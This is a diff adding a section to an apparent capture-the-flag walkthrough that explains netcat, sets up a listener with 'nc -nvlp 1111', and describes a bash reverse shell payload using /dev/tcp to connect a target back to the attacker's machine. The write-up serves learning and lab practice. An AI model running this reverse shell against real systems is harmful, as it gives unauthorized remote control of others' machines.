@@ -137,3 +137,27 @@ Open a new terminal tab and create a file `vim payload.sh` with the following co
 
 The IP address must be your IP address (mine is `10.10.14.10`) and the /1111 is the port we are going to set (you can set whichever you want to) for a netcat listener.
 
+#### Netcat
+
+Netcat network tool for reading from and writing to network connections using TCP or UDP protocols. Some of its applications include:
+
+1. Port Scanning & Banner Grabbing: Checking open ports on a network & retrieving information about a service running on an open port.
+2. File Transfers: Sending and receiving files over a network connection.
+3. Creating Backdoors: Setting up shells on target machines (out goal).
+4. Debugging and Testing Network Services: Sending and receiving arbitrary data to and from network services for testing.
+
+To setup the netcat listener we execute:
+
+```
+nc -nvlp 1111
+```
+
+`nc`: Starts Netcat. `-n`: Tells Netcat to use numeric-only IP addresses, without attempting DNS resolution. `-v`: Enables verbose mode, to get more detailed output. `-l`: Indicates that Netcat should listen for incoming connections. `-p 1111`: Specifies the port number on which Netcat will listen (port 1111 in this case).
+
+##### Context of the attack
+
+1. The attacker runs the command `nc -nvlp 1111` on his machine to start a Netcat listener on port 1111.
+2. The payload `/bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'` is executed on the target machine. This command on the target machine opens a reverse shell, connecting back to the attacker’s machine on port 1111.
+3. The target machine connects to the attacker’s Netcat listener, establishing a reverse shell session. The attacker can now interact with the target machine’s shell through this connection.
+
+Let's continue with the situation.
